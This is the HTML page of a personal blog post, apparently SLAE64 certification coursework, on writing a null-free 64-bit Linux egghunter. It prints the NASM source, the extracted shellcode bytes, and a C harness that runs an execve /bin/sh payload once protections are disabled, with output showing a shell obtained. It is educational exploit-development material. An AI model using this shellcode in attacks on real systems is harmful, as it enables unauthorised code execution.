@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SLAE64 Assignment 3 - Egghunter Shellcode | nibbles</title>
+<meta name="keywords" content="slae64">
+<meta name="description" content="This post introduces my 3rd mission to my SLAE64 journey.
+Introduction The main goal for the third SLAE64 assignment is to create an egghunter shellcode with the following requirements:
+Create a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Creating an Egghunter Shellcode There is a lof of overlap information with my post regarding the SLAE32 Egghunter Shellcode. I advice you to take look at if haven&rsquo;t done already.">
+<meta name="author" content="nibbles">
+<link rel="canonical" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_3/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://0xnibbles.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://0xnibbles.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://0xnibbles.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://0xnibbles.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://0xnibbles.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="SLAE64 Assignment 3 - Egghunter Shellcode" />
+<meta property="og:description" content="This post introduces my 3rd mission to my SLAE64 journey.
+Introduction The main goal for the third SLAE64 assignment is to create an egghunter shellcode with the following requirements:
+Create a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Creating an Egghunter Shellcode There is a lof of overlap information with my post regarding the SLAE32 Egghunter Shellcode. I advice you to take look at if haven&rsquo;t done already." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_3/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-01T16:15:00+00:00" />
+<meta property="article:modified_time" content="2023-01-01T16:15:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SLAE64 Assignment 3 - Egghunter Shellcode"/>
+<meta name="twitter:description" content="This post introduces my 3rd mission to my SLAE64 journey.
+Introduction The main goal for the third SLAE64 assignment is to create an egghunter shellcode with the following requirements:
+Create a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Creating an Egghunter Shellcode There is a lof of overlap information with my post regarding the SLAE32 Egghunter Shellcode. I advice you to take look at if haven&rsquo;t done already."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://0xnibbles.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SLAE64 Assignment 3 - Egghunter Shellcode",
+      "item": "https://0xnibbles.github.io/posts/slae64/slae_64_assignment_3/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SLAE64 Assignment 3 - Egghunter Shellcode",
+  "name": "SLAE64 Assignment 3 - Egghunter Shellcode",
+  "description": "This post introduces my 3rd mission to my SLAE64 journey.\nIntroduction The main goal for the third SLAE64 assignment is to create an egghunter shellcode with the following requirements:\nCreate a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Creating an Egghunter Shellcode There is a lof of overlap information with my post regarding the SLAE32 Egghunter Shellcode. I advice you to take look at if haven\u0026rsquo;t done already.",
+  "keywords": [
+    "slae64"
+  ],
+  "articleBody": " This post introduces my 3rd mission to my SLAE64 journey.\nIntroduction The main goal for the third SLAE64 assignment is to create an egghunter shellcode with the following requirements:\nCreate a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Creating an Egghunter Shellcode There is a lof of overlap information with my post regarding the SLAE32 Egghunter Shellcode. I advice you to take look at if haven’t done already. There are some important concepts and ideas to understand what and why the shellcode is doing.\nSo my challenge for this was trying to port the 32 bit to 64 bit version and see what differences needed to be applied.\n“Assembling” our Egghunter As the shellcode is similar to the 32 bit version, I’ll put directly the final commented version below.\n; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 3 : Egghunter Shellcode (Linux/x86_64) Assembly ; File Name : egg_hunter.nasm global _start section .text _start: xor rcx, rcx mul rcx ; zeroes rax and rdx too page_alignment: or dx, 0xfff ; sets dx to 4095 address_inspection: inc rdx ; sets dx to 4096 xor rsi, rsi ; mode 0 in rsi mov rdi, rdx ; move memory address rdi xor rax,rax add al, 21 ; sys_access syscall syscall cmp al, 0xf2 ; checking if sys_access result in EFAULT exception jz page_alignment mov rax, 0x5090509050905090 ; egg to search in memory mov rdi, rdx ; comparing egg with memory location scasq jnz address_inspection ; move to next address and inspect doing ;all process again scasq ; checking for double egg jnz address_inspection jmp rdi ; we found our egg!!! Compiling and Testing the Shellcode Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/3-Egg-Hunter-Shellcode ‹main●› ╰─$ ../../assembler.sh egghunter.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 54 \"\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x48\\xff\\xc2\\x48\\x31\\xf6\\x48\\x89\\xd7\\x48\\x31\\xc0\\x04\\x15\\x0f\\x05\\x3c\\xf2\\x74\\xe7\\x48\\xb8\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\\x48\\x89\\xd7\\x48\\xaf\\x75\\xdb\\x48\\xaf\\x75\\xd7\\xff\\xe7\" -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char egghunter[] = \"\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x48\\xff\\xc2\\x48\\x31\\xf6\\x48\\x89\\xd7\\x48\\x31\\xc0\\x04\\x15\\x0f\\x05\\x3c\\xf2\\x74\\xe7\\x48\\xb8\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\\x48\\x89\\xd7\\x48\\xaf\\x75\\xdb\\x48\\xaf\\x75\\xd7\\xff\\xe7\"; unsigned char shellcode[] = \\ \"\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\" \"\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\" \"\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\"; int main(void) { printf(\"Egg hunter length: %d\\n\", strlen(egghunter)); printf(\"Shellcode length: %d\\n\", strlen(shellcode)); printf(\"Memory Location of Shellcode: %p\\n\", shellcode); printf(\"Memory Location of EggHunter: %p\\n\", egghunter); int (*ret)() = (int(*)())egghunter; ret(); return 0; } To execute a shell I used the execve shellcode stack covered during the course.\n# gcc and its modern protections - PIE (Position Independent Code) After compiling and retesting the code multiple times it always had abnormal beahviour and I couldn’t make it work for anything.\nAfter some researchign I found out teh reason for that it was due to, gcc in my machine being compile by default with PIE protection enabled.\nMore info here\nthe conclusion is our egghunter shellcode in not position independent code. The solution was to compile it with gcc with the aditional flag -no-pie as stated in the docs.\nCompiling with gcc and executing it\n╭╭─edu@debian ~/Desktop/slae_x86_64/assignments/3-Egg-Hunter-Shellcode ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c -no-pie ╭─edu@debian ~/Desktop/slae_x86_64/assignments/3-Egg-Hunter-Shellcode ‹main●› ╰─$ ./shellcode Egg hunter length: 54 Shellcode length: 48 Memory Location of Shellcode: 0x4040a0 Memory Location of EggHunter: 0x404060 $ whoami edu $ We get a shell!!!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n",
+  "wordCount" : "571",
+  "inLanguage": "en",
+  "datePublished": "2023-01-01T16:15:00Z",
+  "dateModified": "2023-01-01T16:15:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "nibbles"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://0xnibbles.github.io/posts/slae64/slae_64_assignment_3/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "nibbles",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://0xnibbles.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://0xnibbles.github.io/" accesskey="h" title="nibbles (Alt + H)">nibbles</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://0xnibbles.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/about.html" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://0xnibbles.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://0xnibbles.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      SLAE64 Assignment 3 - Egghunter Shellcode
+    </h1>
+    <div class="post-meta"><span title='2023-01-01 16:15:00 +0000 UTC'>January 1, 2023</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;nibbles
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#introduction" aria-label="Introduction">Introduction</a></li>
+                <li>
+                    <a href="#creating-an-egghunter-shellcode" aria-label="Creating an Egghunter Shellcode">Creating an Egghunter Shellcode</a><ul>
+                        
+                <li>
+                    <a href="#assembling-our-egghunter" aria-label="&amp;ldquo;Assembling&amp;rdquo; our Egghunter">&ldquo;Assembling&rdquo; our Egghunter</a></li></ul>
+                </li>
+                <li>
+                    <a href="#compiling-and-testing-the-shellcode" aria-label="Compiling and Testing the Shellcode">Compiling and Testing the Shellcode</a><ul>
+                        
+                <li>
+                    <a href="#-gcc-and-its-modern-protections---pie-position-independent-code" aria-label="# gcc and its modern protections - PIE (Position Independent Code)"># gcc and its modern protections - PIE (Position Independent Code)</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="/slae64/slae64.png#center" alt="SLAE64"  title="SLAE64"  />
+</p>
+<p>This post introduces my 3rd mission to my SLAE64 journey.</p>
+<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
+<p>The main goal for the third SLAE64 assignment is to create an egghunter shellcode with the following requirements:</p>
+<ul>
+<li>Create a working demo of the Egghunter;</li>
+<li>The shellcode should be <strong>null-free</strong>;</li>
+<li>With the ability to be configurable for different payloads.</li>
+</ul>
+<h2 id="creating-an-egghunter-shellcode">Creating an Egghunter Shellcode<a hidden class="anchor" aria-hidden="true" href="#creating-an-egghunter-shellcode">#</a></h2>
+<p>There is a lof of overlap information with my post regarding the <a href="/posts/slae_32_assignment_3/">SLAE32 Egghunter Shellcode</a>. I advice you to take look at if haven&rsquo;t done already. There are some important concepts and ideas to understand what and why the shellcode is doing.</p>
+<p><img loading="lazy" src="/slae64/3/egghunter.png#center" alt="Egghunter"  title="From: https://www.secpod.com/blog/hunting-the-egg-egg-hunter/"  />
+</p>
+<p>So my challenge for this was trying to port the 32 bit to 64 bit version and see what differences needed to be applied.</p>
+<h3 id="assembling-our-egghunter">&ldquo;Assembling&rdquo; our Egghunter<a hidden class="anchor" aria-hidden="true" href="#assembling-our-egghunter">#</a></h3>
+<p>As the shellcode is similar to the 32 bit version, I&rsquo;ll put directly the final commented version below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; Student ID   : PA-31319
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Student Name : Eduardo Silva
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Assignment 3 : Egghunter Shellcode (Linux/x86_64) Assembly
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; File Name    : egg_hunter.nasm
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">section</span> <span style="color:#66d9ef">.text</span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">rcx</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mul</span> <span style="color:#66d9ef">rcx</span> <span style="color:#75715e">; zeroes rax and rdx too
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>page_alignment:
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">or</span> <span style="color:#66d9ef">dx</span>, <span style="color:#ae81ff">0xfff</span>    <span style="color:#75715e">; sets dx to 4095
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>address_inspection:
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rdx</span>         <span style="color:#75715e">; sets dx to 4096
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>    <span style="color:#75715e">; mode 0 in rsi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rdx</span>    <span style="color:#75715e">; move memory address rdi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>,<span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">21</span>      <span style="color:#75715e">; sys_access syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xf2</span>    <span style="color:#75715e">; checking if sys_access result in EFAULT exception
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">jz</span> <span style="color:#66d9ef">page_alignment</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0x5090509050905090</span> <span style="color:#75715e">; egg to search in memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rdx</span>                <span style="color:#75715e">; comparing egg with memory location
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">scasq</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">address_inspection</span>  <span style="color:#75715e">; move to next address and inspect doing 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">;all process again
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scasq</span>                   <span style="color:#75715e">; checking for double egg
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">address_inspection</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">rdi</span>                  <span style="color:#75715e">; we found our egg!!! 
+</span></span></span></code></pre></div><h2 id="compiling-and-testing-the-shellcode">Compiling and Testing the Shellcode<a hidden class="anchor" aria-hidden="true" href="#compiling-and-testing-the-shellcode">#</a></h2>
+<p>Checking <code>assembler.sh</code> output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/3-Egg-Hunter-Shellcode ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ../../assembler.sh egghunter.nasm 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">54</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x31\xc9\x48\xf7\xe1\x66\x81\xca\xff\x0f\x48\xff\xc2\x48\x31\xf6\x48\x89\xd7\x48\x31\xc0\x04\x15\x0f\x05\x3c\xf2\x74\xe7\x48\xb8\x90\x50\x90\x50\x90\x50\x90\x50\x48\x89\xd7\x48\xaf\x75\xdb\x48\xaf\x75\xd7\xff\xe7&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> egghunter[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xc9\x48\xf7\xe1\x66\x81\xca\xff\x0f\x48\xff\xc2\x48\x31\xf6\x48\x89\xd7\x48\x31\xc0\x04\x15\x0f\x05\x3c\xf2\x74\xe7\x48\xb8\x90\x50\x90\x50\x90\x50\x90\x50\x48\x89\xd7\x48\xaf\x75\xdb\x48\xaf\x75\xd7\xff\xe7</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span>  \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x50\x90\x50\x90\x50\x90\x50</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x50\x90\x50\x90\x50\x90\x50</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Egg hunter length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(egghunter));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(shellcode));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Memory Location of Shellcode: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellcode);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Memory Location of EggHunter: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, egghunter);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())egghunter;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>To execute a shell I used the <code>execve shellcode stack</code> covered during the course.</p>
+<h3 id="-gcc-and-its-modern-protections---pie-position-independent-code"># gcc and its modern protections - PIE (Position Independent Code)<a hidden class="anchor" aria-hidden="true" href="#-gcc-and-its-modern-protections---pie-position-independent-code">#</a></h3>
+<p>After compiling and retesting the code multiple times it always had abnormal beahviour and I couldn&rsquo;t make it work for anything.</p>
+<p>After some researchign I found out teh reason for that it was due to, <code>gcc</code> in my machine being compile by default with <code>PIE</code> protection enabled.</p>
+<p><img loading="lazy" src="/slae64/3/pie.jpg#center" alt="gcc &amp;ndash;enable-default-pie"  title="gcc --enable-default-pie"  />
+</p>
+<p>More info <a href="https://nanxiao.me/en/gccs-enable-enable-default-pie-option-make-you-stuck-at-relocation-r_x86_64_32s-against-error/">here</a></p>
+<p>the conclusion is our egghunter shellcode in not position independent code. The solution was to compile it with <code>gcc</code> with the aditional flag <code>-no-pie</code> as stated in the <a href="https://wiki.ubuntu.com/SecurityTeam/PIE">docs</a>.</p>
+<p>Compiling with <code>gcc</code> and executing it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭╭─edu@debian ~/Desktop/slae_x86_64/assignments/3-Egg-Hunter-Shellcode ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c -no-pie
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/3-Egg-Hunter-Shellcode ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./shellcode 
+</span></span><span style="display:flex;"><span>Egg hunter length: <span style="color:#ae81ff">54</span>
+</span></span><span style="display:flex;"><span>Shellcode length: <span style="color:#ae81ff">48</span>
+</span></span><span style="display:flex;"><span>Memory Location of Shellcode: 0x4040a0
+</span></span><span style="display:flex;"><span>Memory Location of EggHunter: 0x404060
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>edu
+</span></span><span style="display:flex;"><span>$ 
+</span></span></code></pre></div><p>We get a shell!!!</p>
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+<p><code>Student ID: PA-31319</code></p>
+<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86">https://github.com/0xnibbles/slae_x86</a></p>
+<hr>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://0xnibbles.github.io/tags/slae64/">slae64</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_4/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>SLAE64 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)</span>
+  </a>
+  <a class="next" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_2/">
+    <span class="title">Next »</span>
+    <br>
+    <span>SLAE64 Assignment 2 - TCP Reverse Shellcode</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE64 Assignment 3 - Egghunter Shellcode on twitter"
